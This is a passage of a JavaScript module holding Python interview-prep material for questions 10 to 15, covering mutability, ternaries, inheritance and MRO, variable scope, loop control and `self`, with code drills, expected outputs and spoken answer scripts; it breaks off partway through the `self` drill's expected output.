// Python Days 4 to 6 (Questions 10 to 18)
// Curated senior-grade technical specs, real drills, deep-dive interview Q&As, and spoken answer scripts

export const PYTHON_DAYS_4_TO_6 = {
  // Q10: Mutable vs Immutable Data Types
  10: {
    id: 10,
    docSpecs: {
      overview: 'In Python, every value is an object, and mutability defines whether an object\'s internal state and memory contents can be modified in-place after instantiation. Immutable types (`int`, `float`, `str`, `tuple`, `frozenset`, `bytes`) cannot be modified in-place—any modification allocates a brand new object in heap memory with a new `id()`. Mutable types (`list`, `dict`, `set`, `bytearray`) permit in-place mutation, preserving the object\'s identity and memory address.',
      table: {
        headers: ['Data Type', 'Mutability', 'Memory Modification Model', 'Hashability (__hash__)'],
        rows: [
          ['`int`, `float`, `bool`', 'Immutable', 'Reallocates new object on arithmetic change', 'Hashable (usable as dict key / set element)'],
          ['`str`, `bytes`', 'Immutable', 'String concatenations create new buffer or use intern table', 'Hashable'],
          ['`tuple`, `frozenset`', 'Immutable container', 'Fixed pointer array; cannot append or remove items', 'Hashable (if all contained items are hashable)'],
          ['`list`', 'Mutable', 'In-place reallocation with dynamic over-allocation buffer', 'Unhashable (`TypeError: unhashable type`)'],
          ['`dict`, `set`', 'Mutable', 'In-place open-addressing hash table resizing', 'Unhashable (can only contain hashable keys/elements)']
        ]
      },
      admonitions: [
        {
          type: 'caution',
          title: 'The Default Mutable Argument Trap',
          content: 'Never use a mutable object as a default function argument (`def append_to(val, lst=[])`). In Python, default arguments are evaluated only ONCE at function definition time (module import). All invocations without an argument share the exact same list instance in memory, creating subtle cross-request state pollution bugs in web workers.'
        },
        {
          type: 'note',
          title: 'Small Integer & String Interning',
          content: 'CPython pre-allocates and interns small integers from -5 to 256 in a static C array. Any assignment `a = 100; b = 100` guarantees `a is b == True`. String literals matching identifier syntax are also interned for fast pointer comparisons.'
        }
      ],
      commands: [
        {
          label: 'Verifying Object Identity & In-Place Mutation',
          cmd: `# Immutable: Memory address changes on modification\nx = 10\nprint("Initial int id:", id(x))\nx += 1\nprint("New int id after +1:", id(x))\n\n# Mutable: Memory address remains identical\nlst = [1, 2]\nprint("Initial list id:", id(lst))\nlst.append(3)\nprint("Same list id after append:", id(lst))`,
          lang: 'python',
          description: 'Inspecting Python object memory addresses using id() to prove in-place mutation vs reallocation.'
        }
      ],
      didYouKnow: {
        title: '💡 Idiomatic Default Argument Pattern',
        content: 'To prevent mutable argument bugs, always use `None` as the default argument sentinel: `def add_item(item, target=None): if target is None: target = []`.'
      }
    },
    challenge: {
      title: 'Mutable Default Argument & Object Identity Drill',
      steps: [
        'Write a function `bad_add(val, items=[])` that appends `val` to `items` and returns it.',
        'Invoke `bad_add("A")` and `bad_add("B")` without passing a second argument and observe state accumulation.',
        'Write the idiomatic `good_add(val, items=None)` pattern and verify isolation.',
        'Demonstrate string interning vs runtime string creation with `is` vs `==`.'
      ],
      codeSnippet: `# 1. Mutable Default Trap
def bad_add(val, items=[]):
    items.append(val)
    return items

print("Call 1:", bad_add("A"))
print("Call 2 (Polluted!):", bad_add("B"))

# 2. Senior Idiomatic Pattern
def good_add(val, items=None):
    if items is None:
        items = []
    items.append(val)
    return items

print("Good Call 1:", good_add("A"))
print("Good Call 2:", good_add("B"))

# 3. Object Identity vs Equality
s1 = "backend_service"
s2 = "backend_service"
print("Interned Strings Identical?", s1 is s2)

s3 = "".join(["backend_", "service"])
print("Value Equality:", s1 == s3)
print("Pointer Identity:", s1 is s3)`,
      expectedOutput: `Call 1: ['A']
Call 2 (Polluted!): ['A', 'B']
Good Call 1: ['A']
Good Call 2: ['B']
Interned Strings Identical? True
Value Equality: True
Pointer Identity: False`,
      interviewQuestion: 'Why does Python evaluate default argument expressions at function definition time rather than at invocation time? How can this cause security or state leaks in a Django API?',
      interviewAnswer: 'In Python, functions are first-class objects created when the `def` statement executes at module import time. The default argument values are evaluated once and stored in the function object\'s `__defaults__` tuple attribute on the heap.\n\nWhen `def get_user_permissions(user, roles=[])` executes, `roles` references a single heap list. If one API request modifies `roles`, that list remains modified for all subsequent HTTP requests handled by that worker process. In a Django or Flask application with multi-threading or persistent worker processes, this can leak privileged user permissions across completely unrelated users.',
      replLink: 'https://onecompiler.com/python'
    },
    scriptData: {
      prompt: 'Can you explain the difference between mutable and immutable data types in Python? What is the "default mutable argument trap" and what happens to memory under the hood?',
      framework: [
        { time: '0-15s', point: 'Core Definition: Immutable objects (int, str, tuple) cannot change in-place; mutable objects (list, dict, set) mutate their existing memory buffer.' },
        { time: '15-45s', point: 'Default Argument Trap: Default arguments evaluate once at module load into func.__defaults__; modifying a mutable default corrupts state across invocations.' },
        { time: '45-60s', point: 'Production Standards: Always use None as sentinel default; use immutable types for cache keys and thread-safe shared configurations.' }
      ],
      spokenScript: `"In Python, data types are partitioned into mutable and immutable objects based on whether their internal heap state can change after allocation. Built-in primitives like integers, floats, strings, and tuples are immutable—modifying them creates a brand new PyObject with a distinct memory address. In contrast, lists, dictionaries, and sets are mutable: mutations like append or pop modify the existing allocated buffer in-place.\n\nThe most infamous production gotcha related to mutability is the 'default mutable argument trap'. Because Python evaluates default arguments once when the function is defined at import time and stores them in the function's '__defaults__' tuple, passing a mutable object like 'items=[]' causes all function calls to share that exact same list instance.\n\nIn a Django or FastAPI web worker, this leads to state leakage where one user's data pollutes another user's request. Our team enforces a strict rule: always use 'None' as the default argument sentinel and initialize fresh collections inside the function body."`,
      buzzwords: ['In-place mutation vs reallocation', '__defaults__ tuple storage', 'Import-time evaluation', 'State pollution in web workers', 'None sentinel pattern', 'Object identity (id())'],
      juniorMistake: 'Using def process_data(data, cache={}) and wondering why cache retains keys from previous unrelated HTTP requests.'
    }
  },

  // Q11: Ternary Operator
  11: {
    id: 11,
    docSpecs: {
      overview: 'Python\'s ternary operator (conditional expression) evaluates as `[on_true] if [condition] else [on_false]`. Introduced in PEP 308, it is a single-line expression that evaluates lazily using short-circuit evaluation—meaning only the branch corresponding to the evaluated condition is executed, avoiding unnecessary CPU cycles or premature function calls.',
      table: null,
      admonitions: [
        {
          type: 'note',
          title: 'Short-Circuit Branch Evaluation',
          content: 'Just like `and` / `or`, the ternary operator only evaluates the branch that matches the condition. If `condition` is True, `[on_false]` is never evaluated, making it safe to write `result = cache.get(k) if cache else fetch_from_db()`.'
        },
        {
          type: 'tip',
          title: 'Expression vs Statement',
          content: 'Because the ternary operator is an expression, it returns a value and can be embedded directly inside list comprehensions, return statements, or dictionary keys where traditional multi-line `if/else` statements are syntactically invalid.'
        }
      ],
      commands: [
        {
          label: 'Ternary Syntax & Short-Circuit Verification',
          cmd: `user_role = "admin"\n\n# Standard ternary expression\naccess_level = "FULL" if user_role == "admin" else "READ_ONLY"\nprint("Access Level:", access_level)\n\n# Short-circuit proof (division by zero never reached)\nx = 10\nres = "OK" if x > 0 else 1 / 0\nprint("Short-circuit result:", res)`,
          lang: 'python',
          description: 'Using ternary expression with short-circuit evaluation.'
        }
      ],
      didYouKnow: {
        title: '💡 Tuple / Dict Hack vs True Ternary',
        content: 'Before PEP 308, programmers wrote `(on_false, on_true)[condition]`. However, this was dangerous because Python had to evaluate BOTH branches before indexing the tuple, which broke if one branch raised an exception or triggered a heavy database query!'
      }
    },
    challenge: {
      title: 'Ternary Expression Short-Circuit & Nested Readability Drill',
      steps: [
        'Write a function that calculates discount: 20% for "VIP", 10% for "STANDARD", 0% otherwise using ternary expressions.',
        'Demonstrate short-circuit evaluation by proving that an expensive function is NOT called when the condition is false.',
        'Embed a ternary expression inside a List Comprehension to categorize numbers as "EVEN" or "ODD".'
      ],
      codeSnippet: `# 1. Nested Ternary (use sparingly for readability)
def get_discount(tier):
    return 0.20 if tier == "VIP" else (0.10 if tier == "STANDARD" else 0.0)

print("VIP Discount:", get_discount("VIP"))
print("Guest Discount:", get_discount("GUEST"))

# 2. Short-Circuit Verification
def expensive_db_query():
    print("WARNING: Expensive query executed!")
    return "DB_DATA"

cached_value = "REDIS_DATA"
# Since cached_value is truthy, expensive_db_query() MUST NOT RUN
data = cached_value if cached_value else expensive_db_query()
print("Retrieved data:", data)

# 3. Inside Comprehension
labels = ["EVEN" if n % 2 == 0 else "ODD" for n in range(4)]
print("Comprehension labels:", labels)`,
      expectedOutput: `VIP Discount: 0.2
Guest Discount: 0.0
Retrieved data: REDIS_DATA
Comprehension labels: ['EVEN', 'ODD', 'EVEN', 'ODD']`,
      interviewQuestion: 'Why is Python\'s ternary syntax formatted as "X if C else Y" rather than C-style "C ? X : Y"? What are the readability guidelines for nesting them?',
      interviewAnswer: 'Guido van Rossum and the Python core developers chose "X if C else Y" in PEP 308 because Python syntax prioritizes the most common case: reading what value is being selected first ("X"), followed by the predicate ("if C"), and the fallback ("else Y").\n\nIn senior backend codebases (PEP 8), nesting multiple ternary operators is considered an anti-pattern because it severely impairs readability and confuses code reviewers. If more than one condition is needed, standard `if/elif/else` statements or a dictionary dispatch table should be used.',
      replLink: 'https://onecompiler.com/python'
    },
    scriptData: {
      prompt: 'How does the ternary operator work in Python, how does it evaluate expressions under the hood, and what are the architectural best practices regarding its use in production code?',
      framework: [
        { time: '0-15s', point: 'Syntax & Nature: "X if C else Y" is a conditional expression evaluated lazily with short-circuiting.' },
        { time: '15-45s', point: 'Short-Circuit Mechanics: Only the selected branch executes; the unselected branch is completely bypassed, preventing unexpected errors or RPC calls.' },
        { time: '45-60s', point: 'Senior Production Rule: Keep it single-level; avoid nested chaining; use dictionary mapping or standard if/elif blocks for multi-branch branching.' }
      ],
      spokenScript: `"In Python, the ternary operator is a conditional expression structured as 'X if condition else Y'. Because it is an expression rather than a statement, it evaluates to a concrete value and can be embedded directly in return statements, list comprehensions, and dictionary payloads.\n\nUnder the hood, CPython implements strict short-circuit evaluation: if the predicate is true, only 'X' is evaluated, and 'Y' is completely bypassed without executing its bytecode. This makes it completely safe for guarding against expensive database queries or null dereferences—for example, 'user.profile.bio if user.profile else None'.\n\nIn our production code reviews, our standard is strict: a ternary operator is ideal for simple fallbacks or binary assignments. If you find yourself nesting ternaries to handle three or more branches, you should immediately refactor to a dictionary lookup table or an explicit 'if/elif/else' block for maintainability."`,
      buzzwords: ['Conditional expression (PEP 308)', 'Short-circuit evaluation', 'Expression vs Statement', 'Branch bypass', 'Readability threshold (PEP 8)'],
      juniorMistake: 'Nesting three ternary expressions on one line, creating unmaintainable spaghetti code that fails code review.'
    }
  },

  // Q12: Inheritance in Python
  12: {
    id: 12,
    docSpecs: {
      overview: 'Inheritance in Python allows a child class to inherit attributes, methods, and behaviors from one or more parent classes. Python supports Single, Multiple, Multilevel, and Hierarchical inheritance. Method resolution is governed deterministically by the C3 Linearization Algorithm, accessed via the Method Resolution Order (`Class.__mro__`), ensuring cooperative multiple inheritance when `super()` is used correctly.',
      table: {
        headers: ['Inheritance Type', 'Syntax Pattern', 'Key Characteristics', 'Backend Architecture Use Case'],
        rows: [
          ['Single Inheritance', '`class Child(Parent):`', 'Direct parent-child hierarchy', 'Extending Django `models.Model` or custom base exceptions.'],
          ['Multiple Inheritance', '`class Child(Base1, Base2):`', 'Combines features from multiple base classes', 'Django Mixins: combining `LoginRequiredMixin` and `ListView`.'],
          ['Multilevel Inheritance', '`class C(B): ... class B(A):`', 'Chain of inheritance', 'Domain model hierarchies (e.g., `BaseAuditedModel` -> `TenantModel` -> `Invoice`).'],
          ['Composition over Inheritance', '`self.service = Service()`', 'Has-a relationship rather than is-a', 'Preferred for loose coupling; injecting payment processors or caching engines.']
        ]
      },
      admonitions: [
        {
          type: 'note',
          title: 'The C3 Linearization Algorithm (MRO)',
          content: 'Python resolves methods using C3 Linearization. It guarantees two critical properties: children always precede parents, and the order of base classes declared in the class definition is strictly preserved. Inspect any class order using `ClassName.__mro__`.'
        },
        {
          type: 'caution',
          title: 'Always Use super() Cooperatively',
          content: 'Never call base class methods directly like `Parent.__init__(self)` in multiple inheritance hierarchies. Calling `Parent.__init__` hardcodes the call chain and bypasses the MRO, leading to skipped initializations in sibling mixins.'
        }
      ],
      commands: [
        {
          label: 'Inspecting Class MRO (Method Resolution Order)',
          cmd: `class MixinA:\n    def execute(self):\n        print("MixinA running")\n        super().execute()\n\nclass MixinB:\n    def execute(self):\n        print("MixinB running")\n        super().execute()\n\nclass RootBase:\n    def execute(self):\n        print("RootBase running")\n\nclass Worker(MixinA, MixinB, RootBase):\n    pass\n\n# Inspect MRO resolution chain\nprint("Class MRO:", [c.__name__ for c in Worker.__mro__])\nw = Worker()\nw.execute()`,
          lang: 'python',
          description: 'Inspecting __mro__ and verifying cooperative method chaining with super().'
        }
      ],
      didYouKnow: {
        title: '💡 Django Mixin Positioning Rule',
        content: 'In Django views, mixins MUST be placed to the LEFT of the generic base view: `class OrderView(LoginRequiredMixin, ListView):`. Placing `ListView` first causes Django to resolve dispatch methods from `ListView` before `LoginRequiredMixin`, bypassing authentication!'
      }
    },
    challenge: {
      title: 'Cooperative Multiple Inheritance & MRO Verification Drill',
      steps: [
        'Define a `LoggerMixin` and an `AuditorMixin`, each calling `super().__init__()`.',
        'Define a `BaseModel` that terminates the cooperative chain.',
        'Create a class `Order(LoggerMixin, AuditorMixin, BaseModel)` and instantiate it.',
        'Print `Order.__mro__` to verify the resolution sequence.',
        'Demonstrate why swapping mixin order changes execution behavior.'
      ],
      codeSnippet: `class LoggerMixin:
    def __init__(self, **kwargs):
        print("1. LoggerMixin initialized")
        super().__init__(**kwargs)

class AuditorMixin:
    def __init__(self, **kwargs):
        print("2. AuditorMixin initialized")
        super().__init__(**kwargs)

class BaseModel:
    def __init__(self, **kwargs):
        print("3. BaseModel initialized")
        super().__init__()

class Order(LoggerMixin, AuditorMixin, BaseModel):
    def __init__(self, order_id, **kwargs):
        print(f"0. Creating Order #{order_id}")
        super().__init__(**kwargs)

# Instantiate
o = Order(101)

# Inspect MRO
print("\\nMRO Sequence:")
for idx, cls in enumerate(Order.__mro__):
    print(f"  [{idx}] {cls.__name__}")`,
      expectedOutput: `0. Creating Order #101
1. LoggerMixin initialized
2. AuditorMixin initialized
3. BaseModel initialized

MRO Sequence:
  [0] Order
  [1] LoggerMixin
  [2] AuditorMixin
  [3] BaseModel
  [4] object`,
      interviewQuestion: 'How does super() work in Python multiple inheritance? What algorithm does Python use to determine Method Resolution Order (MRO)?',
      interviewAnswer: 'In Python, super() does not simply call the immediate parent class; it dynamically resolves the NEXT class in the calling instance\'s Method Resolution Order (MRO). The MRO is calculated at class definition time using the C3 Linearization Algorithm.\n\nC3 guarantees that: 1) Subclasses appear before base classes, 2) The relative order of base classes listed in the class definition is preserved, and 3) Monotonicity is maintained (if class A precedes class B in one MRO, it cannot follow class B in any subclass MRO; violating this raises TypeError: Cannot create a consistent method resolution order).\n\nBecause super() delegates along the MRO, all sibling mixins get called cooperatively provided every method in the chain uses super() and forwards **kwargs.',
      replLink: 'https://onecompiler.com/python'
    },
    scriptData: {
      prompt: 'How does multiple inheritance work in Python? Walk me through the C3 Linearization Algorithm, how super() resolves methods, and how you architect mixins in a backend web framework like Django.',
      framework: [
        { time: '0-15s', point: 'Core Concept: Python supports multiple inheritance resolved deterministically via the C3 Linearization Algorithm (MRO).' },
        { time: '15-45s', point: 'super() Cooperative Chaining: super() does not call the parent; it calls the next class in the runtime instance\'s MRO.' },
        { time: '45-60s', point: 'Production Application: Mixin design in Django views; place mixins to the left of base classes; prefer composition over inheritance for complex domains.' }
      ],
      spokenScript: `"Python provides full support for multiple inheritance, which it resolves deterministically using the C3 Linearization Algorithm. When a method or attribute is accessed on an instance, CPython traverses the class's '__mro__'—or Method Resolution Order—which guarantees that child classes always take precedence over base classes and base class ordering is preserved.\n\nA fundamental concept that many candidates misunderstand is 'super()'. In Python, 'super()' does not mean 'call my parent'; it means 'call the next class in the instance's MRO'. For cooperative multiple inheritance to work, every class in the hierarchy must call 'super()' and forward keyword arguments.\n\nIn our backend architecture, we use multiple inheritance primarily for Mixins—such as Django's 'LoginRequiredMixin' or custom audit loggers. We enforce two strict guidelines: first, mixins must always be listed from left to right before the concrete base view; second, if a business domain requires deep multi-level hierarchies, we refactor to composition to avoid brittle coupling."`,
      buzzwords: ['C3 Linearization Algorithm', 'Method Resolution Order (__mro__)', 'Cooperative multiple inheritance', 'super() dynamic dispatch', 'Mixin architecture', 'Composition over Inheritance'],
      juniorMistake: 'Directly calling BaseClass.__init__(self) instead of super(), which bypasses sibling mixins in multiple inheritance chains.'
    }
  },

  // Q13: Local vs Global Variables
  13: {
    id: 13,
    docSpecs: {
      overview: 'Python resolves variables using the LEGB rule (Local, Enclosing, Global, Built-in). A local variable is bound inside a function\'s execution frame and stored in CPython\'s fast local array (`fastlocals`), deallocated when the frame returns. A global variable is defined at the module level and stored in the module\'s `__dict__` (`globals()`). Modifying a global variable inside a function requires the explicit `global` keyword.',
      table: {
        headers: ['Attribute', 'Local Variable', 'Global Variable', 'Performance & Architecture Impact'],
        rows: [
          ['Storage Location', 'CPython stack frame `fastlocals` array', 'Module-level dictionary `globals()`', 'Local lookups use `LOAD_FAST` bytecode (~3x faster than `LOAD_GLOBAL`).'],
          ['Lifetime', 'Created on function call; freed on frame return', 'Lives for the entire duration of the Python process', 'Global variables retain memory indefinitely; avoid storing large querysets globally.'],
          ['Modification Inside Function', 'Direct assignment (`x = 10`)', 'Requires explicit `global x` declaration', 'Omitting `global` creates a shadowing local variable or raises `UnboundLocalError`.'],
          ['Thread Safety', 'Thread-safe (isolated to thread stack frame)', 'NOT thread-safe (shared across concurrent threads)', 'Mutating module-level globals in multi-threaded servers causes race conditions.']
        ]
      },
      admonitions: [
        {
          type: 'caution',
          title: 'The UnboundLocalError Trap',
          content: 'If you read a variable inside a function and assign to it anywhere in that same function body without declaring `global`, Python marks it as local at compile time! Running the function will crash on the read statement with `UnboundLocalError: cannot access local variable \'x\' where it is not associated with a value`.'
        },
        {
          type: 'tip',
          title: 'LOAD_FAST Bytecode Optimization',
          content: 'In high-throughput loops, binding global functions or attributes to local variables (e.g. `append = my_list.append`) boosts speed by 25% because CPython replaces hash-table dictionary lookups (`LOAD_GLOBAL`) with instant array indexing (`LOAD_FAST`).'
        }
      ],
      commands: [
        {
          label: 'UnboundLocalError Demonstration & global Fix',
          cmd: `counter = 0\n\n# Fails with UnboundLocalError if you uncomment:\n# def broken_increment():\n#     counter += 1  # Python marks 'counter' local because of += assignment\n\n# Correct implementation using global\ndef correct_increment():\n    global counter\n    counter += 1\n    return counter\n\nprint("Counter after increment:", correct_increment())`,
          lang: 'python',
          description: 'Showing how assignment triggers local compilation and requires global declaration.'
        }
      ],
      didYouKnow: {
        title: '💡 Module-Level Global Scope in Python',
        content: 'Python has NO true "universal" global scope across different files. "Global" in Python strictly means module-level! A global variable declared in `auth.py` is isolated to `auth.py`\'s dictionary unless explicitly imported by another module.'
      }
    },
    challenge: {
      title: 'Diagnosing UnboundLocalError & globals() Introspection Drill',
      steps: [
        'Define a global variable `API_RATE_LIMIT = 100`.',
        'Write a function that attempts to print `API_RATE_LIMIT` and then sets `API_RATE_LIMIT = 200`. Observe `UnboundLocalError`.',
        'Fix the function using the `global` keyword.',
        'Inspect `globals()` and `locals()` to observe the physical dictionaries in memory.'
      ],
      codeSnippet: `API_RATE_LIMIT = 100

# 1. Reproduce UnboundLocalError
def broken_access():
    try:
        # Python compiles API_RATE_LIMIT as LOCAL because of assignment below
        print("Value:", API_RATE_LIMIT)
        API_RATE_LIMIT = 200
    except UnboundLocalError as err:
        print("Caught Expected Trap:", err)

broken_access()

# 2. Fix using global
def correct_access():
    global API_RATE_LIMIT
    print("Initial Global:", API_RATE_LIMIT)
    API_RATE_LIMIT = 250
    print("Modified Global:", API_RATE_LIMIT)

correct_access()

# 3. Inspect dictionaries
print("Is API_RATE_LIMIT in globals()?", "API_RATE_LIMIT" in globals())`,
      expectedOutput: `Caught Expected Trap: cannot access local variable 'API_RATE_LIMIT' where it is not associated with a value
Initial Global: 100
Modified Global: 250
Is API_RATE_LIMIT in globals()? True`,
      interviewQuestion: 'Why does Python raise UnboundLocalError before the line where a variable is assigned? How does Python\'s compiler determine variable scope?',
      interviewAnswer: 'Python determines scope statically at compile time (when the function is compiled into a code object), NOT dynamically at runtime. If a variable is assigned anywhere within a function body (including +=, =, or in an except block), the Python compiler flags that variable name as LOCAL for the entire function.\n\nWhen execution reaches a statement that reads the variable before the assignment has executed, Python checks the local stack frame, finds no bound value, and raises "UnboundLocalError". It does NOT fall back to the global scope because the compiler has already committed to it being local. Declaring "global var_name" instructs the compiler to omit the local binding.',
      replLink: 'https://onecompiler.com/python'
    },
    scriptData: {
      prompt: 'How does Python handle variable scoping between local and global scopes? Walk me through what causes an UnboundLocalError and why using mutable global variables in a multi-threaded web server is dangerous.',
      framework: [
        { time: '0-15s', point: 'LEGB Rule & Storage: Local variables live in CPython\'s fast local array; global variables live in the module\'s dictionary.' },
        { time: '15-45s', point: 'Compile-Time Resolution & UnboundLocalError: Assignment anywhere in a function compiles the variable as local; reading before assignment crashes.' },
        { time: '45-60s', point: 'Production Thread Safety: Global state is shared across threads and causes race conditions; use thread-local storage or database state instead.' }
      ],
      spokenScript: `"In Python, variable scoping follows the LEGB rule—Local, Enclosing, Global, and Built-in. Under the hood, local variables are stored in a fixed-size C array on the function's execution frame and accessed using the ultra-fast 'LOAD_FAST' bytecode. Global variables, by contrast, reside in the module's dictionary and require 'LOAD_GLOBAL' hash lookups.\n\nA classic trap is 'UnboundLocalError'. Python determines scope statically at compile time: if a variable is assigned anywhere within a function, the compiler marks it as local throughout that entire function. If you attempt to read it before that assignment executes, Python checks the local frame, finds it uninitialized, and raises an UnboundLocalError instead of falling back to global scope.\n\nIn backend production systems, we treat mutable module-level globals as a serious code smell. In WSGI servers like Gunicorn running multi-threaded worker pools, global state is shared across threads without locks, leading to race conditions and data corruption. We encapsulate state inside database records, Redis caches, or ThreadLocal storage."`,
      buzzwords: ['LEGB scoping rule', 'LOAD_FAST vs LOAD_GLOBAL', 'Static compile-time binding', 'UnboundLocalError trap', 'Module dictionary storage', 'Thread safety & Race conditions'],
      juniorMistake: 'Thinking Python looks up variables dynamically line-by-line and not understanding why reading a global before reassigning it crashes.'
    }
  },

  // Q14: Break, Continue and Pass Statements
  14: {
    id: 14,
    docSpecs: {
      overview: 'In Python, `break`, `continue`, and `pass` control execution flow inside iterative loops and code blocks. `break` terminates the nearest enclosing loop immediately, skipping any associated loop `else` clause. `continue` skips the remainder of the current iteration and jumps directly to the next loop evaluation. `pass` is a syntactic no-operation placeholder that emits a bytecode `NOP`, allowing empty blocks where a statement is syntactically required.',
      table: {
        headers: ['Statement', 'Execution Flow Impact', 'Loop `else` Block Executed?', 'CPython Bytecode'],
        rows: [
          ['`break`', 'Immediately exits loop; jumps past the loop body', 'NO (loop `else` is skipped)', '`JUMP_ABSOLUTE` past block'],
          ['`continue`', 'Aborts current iteration; advances to next cycle', 'YES (when loop completes naturally)', '`JUMP_ABSOLUTE` to loop head'],
          ['`pass`', 'No operation; execution continues to next line', 'YES (normal completion)', '`NOP` (or omitted by peephole optimizer)']
        ]
      },
      admonitions: [
        {
          type: 'note',
          title: 'The Loop "else" Clause Pattern',
          content: 'In Python, `for` and `while` loops support an `else:` block! The `else` block executes ONLY if the loop completes all iterations normally without hitting a `break` statement. This is the idiomatic search pattern in Python, replacing clumsy boolean flag variables.'
        },
        {
          type: 'tip',
          title: 'pass vs ellipsis (...)',
          content: 'In modern Python, you can use the Ellipsis literal `...` interchangeably with `pass` for empty function stubs and abstract methods. Type checkers and stub files (`.pyi`) often prefer `...`.'
        }
      ],
      commands: [
        {
          label: 'Idiomatic For-Else Search Pattern with Break',
          cmd: `target = "user_42"\nusers = ["user_1", "user_10", "user_42", "user_99"]\n\nfor u in users:\n    if u == target:\n        print("Found user:", u)\n        break\nelse:\n    # Executes ONLY if loop finishes without break!\n    print("User not found!")`,
          lang: 'python',
          description: 'Using loop else clause to eliminate unnecessary boolean flag variables.'
        }
      ],
      didYouKnow: {
        title: '💡 Loop Else Origin',
        content: 'Python\'s loop `else` syntax comes from Donald Knuth\'s structured programming proposals. Think of it as `for ... break_else:` — it runs if the loop was NOT broken out of!'
      }
    },
    challenge: {
      title: 'Loop Control & For-Else Search Pattern Drill',
      steps: [
        'Implement a prime number check using a `for ... else` construct without any boolean flag variables.',
        'Use `continue` to skip even numbers during processing.',
        'Use `break` when a factor is found.',
        'Demonstrate that `pass` acts as a no-op placeholder in an abstract class or empty handler.'
      ],
      codeSnippet: `def is_prime(n):
    if n < 2:
        return False
    for i in range(2, int(n**0.5) + 1):
        if n % i == 0:
            print(f"  {n} is divisible by {i} -> BREAKING")
            break
    else:
        # Executes ONLY if no break occurred!
        print(f"  {n} had no divisors -> PRIME FOUND")
        return True
    return False

print("Testing 11:")
is_prime(11)

print("\\nTesting 15:")
is_prime(15)

# Continue and Pass demonstration
print("\\nOdd numbers under 6:")
for x in range(6):
    if x % 2 == 0:
        continue  # Skip even
    pass          # Placeholder
    print(" ", x)`,
      expectedOutput: `Testing 11:
  11 had no divisors -> PRIME FOUND

Testing 15:
  15 is divisible by 3 -> BREAKING

Odd numbers under 6:
  1
  3
  5`,
      interviewQuestion: 'When does the "else" clause of a Python for-loop execute, and why is it preferred over a boolean flag variable in search algorithms?',
      interviewAnswer: 'The "else" clause of a for or while loop executes if and only if the loop terminates normally—meaning the iterable was exhausted or the while condition became false, without encountering a `break` statement. If a `break` occurs, the `else` block is completely skipped.\n\nIn search algorithms, junior developers typically declare a boolean flag like `found = False`, set `found = True` before breaking, and check `if not found:` after the loop. The `for...else` construct eliminates this auxiliary flag variable, saving lines of code and preventing flag synchronization bugs.',
      replLink: 'https://onecompiler.com/python'
    },
    scriptData: {
      prompt: 'Can you explain the differences between break, continue, and pass in Python? Walk me through how the loop "else" clause works and provide a production use case where it simplifies code.',
      framework: [
        { time: '0-15s', point: 'Definitions: break terminates the loop; continue jumps to next cycle; pass is a no-op placeholder.' },
        { time: '15-45s', point: 'Loop else Mechanics: The else block runs only if the loop terminates naturally without hitting break.' },
        { time: '45-60s', point: 'Production Application: Search routines (e.g. cache lookups, database retries); eliminates clumsy boolean flag variables.' }
      ],
      spokenScript: `"In Python, 'break', 'continue', and 'pass' serve distinct control-flow purposes. 'break' immediately terminates the innermost loop, jumping execution past the entire loop block. 'continue' aborts the current iteration and jumps directly to the next loop evaluation. 'pass' is a syntactic no-operation statement: it tells the compiler that a block exists without executing any action, useful for empty exception handlers or abstract interfaces.\n\nA powerful yet underutilized Python feature is the loop 'else' clause. In a 'for' or 'while' loop, an 'else' block executes if and only if the loop completed naturally without hitting a 'break' statement.\n\nIn production backend code, we use 'for...else' for clean search and retry logic—for instance, iterating across a pool of database replica connections. If a healthy connection is established, we break; if all replicas are exhausted without a break, the 'else' block automatically raises a ServiceUnavailable exception, eliminating the need for boolean flags like 'found = False'."`,
      buzzwords: ['Loop else clause', 'Early break termination', 'No-op statement (pass / Ellipsis)', 'Elimination of boolean flags', 'Search & fallback pattern'],
      juniorMistake: 'Thinking loop else executes like an if-else statement every time the loop condition is false during iteration.'
    }
  },

  // Q15: self keyword
  15: {
    id: 15,
    docSpecs: {
      overview: 'In Python, `self` is an explicit reference to the current instance of the class upon which a method is invoked. Unlike languages like Java or C++ where `this` is implicit and hidden, Python\'s design philosophy explicitly passes the instance as the first parameter. When an instance method is called (`obj.method(arg)`), Python\'s descriptor protocol automatically binds the function into a method object, translating the call behind the scenes to `Class.method(obj, arg)`.',
      table: null,
      admonitions: [
        {
          type: 'note',
          title: 'The Descriptor Protocol Behind self',
          content: 'Methods in Python classes are actually standard functions that implement the Descriptor Protocol (`__get__`). When accessed via `instance.method`, the function\'s `__get__` binds `instance` to the first argument (`self`), returning a callable bound method object.'
        },
        {
          type: 'tip',
          title: 'Why "self" is a Convention, Not a Keyword',
          content: '`self` is not a reserved Python language keyword! You could technically name it `this` or `me`. However, naming it anything other than `self` violates PEP 8, confuses static linters (flake8, pylint), and will fail every code review in professional engineering teams.'
        }
      ],
      commands: [
        {
          label: 'Proof of Method Binding Translation',
          cmd: `class PaymentGateway:\n    def charge(self, amount):\n        print(f"Charging \${amount} on gateway instance: {id(self)}")\n\ngw = PaymentGateway()\n\n# 1. Standard instance call\ngw.charge(100)\n\n# 2. Equivalent explicit class call (what Python does under the hood)\nPaymentGateway.charge(gw, 100)`,
          lang: 'python',
          description: 'Showing how obj.method(arg) translates to Class.method(obj, arg).'
        }
      ],
      didYouKnow: {
        title: '💡 Zen of Python Design Choice',
        content: 'Python\'s creator Guido van Rossum insisted on explicit `self` to uphold "Explicit is better than implicit" from the Zen of Python. It makes variable resolution unambiguous: local variables never collide with instance attributes (`self.x` vs `x`).'
      }
    },
    challenge: {
      title: 'Method Descriptor Binding & Class vs Static Methods Drill',
      steps: [
        'Create a class `Account` with an instance method `deposit(self, amt)`.',
        'Call `deposit` via the instance `acc.deposit(50)` and via the class `Account.deposit(acc, 50)`.',
        'Add a `@classmethod` receiving `cls` and a `@staticmethod` receiving neither `self` nor `cls`.',
        'Compare the method types using `type(acc.deposit)` vs `type(Account.deposit)`.'
      ],
      codeSnippet: `class Account:
    bank_name = "GlobalBank"

    def __init__(self, balance):
        self.balance = balance

    def deposit(self, amt):
        self.balance += amt
        return self.balance

    @classmethod
    def get_bank(cls):
        return cls.bank_name

    @staticmethod
    def calculate_interest(principal, rate):
        return principal * rate

acc = Account(100)

# 1. Method Binding Equivalence
print("Instance call deposit:", acc.deposit(50))
print("Class call deposit:", Account.deposit(acc, 50))

# 2. Inspect Bound Method vs Function
print("acc.deposit type:", type(acc.deposit))
print("Account.deposit type:", type(Account.deposit))

# 3. Classmethod vs Staticmethod
print("Bank Name:", acc.get_bank())
print("Interest:", Account.calculate_interest(1000, 0.05))`,
      expectedOutput: `Instance call deposit: 150
